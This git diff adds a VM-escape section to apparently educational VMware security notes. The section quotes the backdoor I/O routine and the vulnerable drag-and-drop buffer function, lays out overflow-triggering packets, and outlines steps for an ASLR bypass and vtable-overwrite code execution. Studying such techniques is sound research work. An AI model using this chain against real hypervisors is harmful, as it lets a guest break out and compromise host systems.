@@ -262,9 +262,170 @@ ethernet1.address = "00:31:34:37:A6:F9"
 
 # VM escape
 
-## VM escape
+## VM Escape
 
-WIP
+Virtual machine escape is an exploit in which the attacker runs code on a VM that allows an operating system running within it to break out and interact directly with the hypervisor.
+
+## Case Study - VMware
+
+- Backdoor
+	- RPCI (Remote Procedure Call Interface)
+	- Drag n Drop
+	- Copy Paste
+
+```c
+void
+Backdoor_InOut(Backdoor_proto *myBp) // IN/OUT
+{
+   uint64 dummy;
+
+   __asm__ __volatile__(
+#ifdef __APPLE__
+        /*
+         * Save %rbx on the stack because the Mac OS GCC doesn't want us to
+         * clobber it - it erroneously thinks %rbx is the PIC register.
+         * (Radar bug 7304232)
+         */
+        "pushq %%rbx"           "\n\t"
+#endif
+        "pushq %%rax"           "\n\t"
+        "movq 40(%%rax), %%rdi" "\n\t"
+        "movq 32(%%rax), %%rsi" "\n\t"
+        "movq 24(%%rax), %%rdx" "\n\t"
+        "movq 16(%%rax), %%rcx" "\n\t"
+        "movq  8(%%rax), %%rbx" "\n\t"
+        "movq   (%%rax), %%rax" "\n\t"
+        "inl %%dx, %%eax"       "\n\t"  /* NB: There is no inq instruction */
+        "xchgq %%rax, (%%rsp)"  "\n\t"
+        "movq %%rdi, 40(%%rax)" "\n\t"
+        "movq %%rsi, 32(%%rax)" "\n\t"
+        "movq %%rdx, 24(%%rax)" "\n\t"
+        "movq %%rcx, 16(%%rax)" "\n\t"
+        "movq %%rbx,  8(%%rax)" "\n\t"
+        "popq          (%%rax)" "\n\t"
+#ifdef __APPLE__
+        "popq %%rbx"            "\n\t"
+#endif
+      : "=a" (dummy)
+      : "0" (myBp)
+      /*
+       * vmware can modify the whole VM state without the compiler knowing
+       * it. So far it does not modify EFLAGS. --hpreg
+       */
+      :
+#ifndef __APPLE__
+      /* %rbx is unchanged at the end of the function on Mac OS. */
+      "rbx",
+#endif
+      "rcx", "rdx", "rsi", "rdi", "memory"
+   );
+}
+```
+
+### The Vulnerability
+
+```c
+Bool
+DnD_TransportBufAppendPacket(DnDTransportBuffer *buf,          // IN/OUT
+                             DnDTransportPacketHeader *packet, // IN
+                             size_t packetSize)                // IN
+{
+   ASSERT(buf);
+   ASSERT(packetSize == (packet->payloadSize + DND_TRANSPORT_PACKET_HEADER_SIZE) &&
+          packetSize <= DND_MAX_TRANSPORT_PACKET_SIZE &&
+          (packet->payloadSize + packet->offset) <= packet->totalSize &&
+          packet->totalSize <= DNDMSG_MAX_ARGSZ);
+
+   if (packetSize != (packet->payloadSize + DND_TRANSPORT_PACKET_HEADER_SIZE) ||
+       packetSize > DND_MAX_TRANSPORT_PACKET_SIZE ||
+       (packet->payloadSize + packet->offset) > packet->totalSize || //[1]
+       packet->totalSize > DNDMSG_MAX_ARGSZ) {
+      goto error;
+   }
+
+   /*
+    * If seqNum does not match, it means either this is the first packet, or there
+    * is a timeout in another side. Reset the buffer in all cases.
+    */
+   if (buf->seqNum != packet->seqNum) {
+      DnD_TransportBufReset(buf);
+   }
+
+   if (!buf->buffer) {
+      ASSERT(!packet->offset);
+      if (packet->offset) {
+         goto error;
+      }
+      buf->buffer = Util_SafeMalloc(packet->totalSize);
+      buf->totalSize = packet->totalSize;
+      buf->seqNum = packet->seqNum;
+      buf->offset = 0;
+   }
+
+   if (buf->offset != packet->offset) {
+      goto error;
+   }
+
+   memcpy(buf->buffer + buf->offset,
+          packet->payload,
+          packet->payloadSize);
+   buf->offset += packet->payloadSize;
+   return TRUE;
+
+error:
+   DnD_TransportBufReset(buf);
+   return FALSE;
+}
+```
+
+### Overflow
+
+```
+packet 1{
+ ...
+ totalSize = 0x100
+ payloadOffset = 0
+ payloadSize = 0x50
+ seqNum = 0x41414141
+ ...
+ #...0x50 bytes...#
+}
+
+packet 2{
+ ...
+ totalSize = 0x1000
+ payloadOffset = 0x50
+ payloadSize = 0x100
+ seqNum = 0x41414141
+ ...
+ #...0x100 bytes...#
+}
+```
+
+## Exploit
+
+```
+tools.capability.dnd_version 3
+tools.capability.copypaste_version 3
+vmx.capability.dnd_version
+vmx.capability.copypaste_version
+```
+
+### Defeating ASLR
+
+```
+info-set guestinfo.KEY VALUE
+info-get guestinfo.KEY
+```
+
+`VALUE` is a string and its string length controls the allocation size of a buffer on the heap.
+
+### Code Execution
+
+- Send a `unity.window.contents.start` to write a 64-bit address of a stack pivot gadget at a know address with the `height` and `width` parameters.
+- Overwrite the vtable address with a pointer to the 64-bit address (adjusted with the offset of the vtable entry that will be called).
+- Trigger the use of the vtable by sending a CopyPaste command.
+- ROP.
 
 # Lab
 
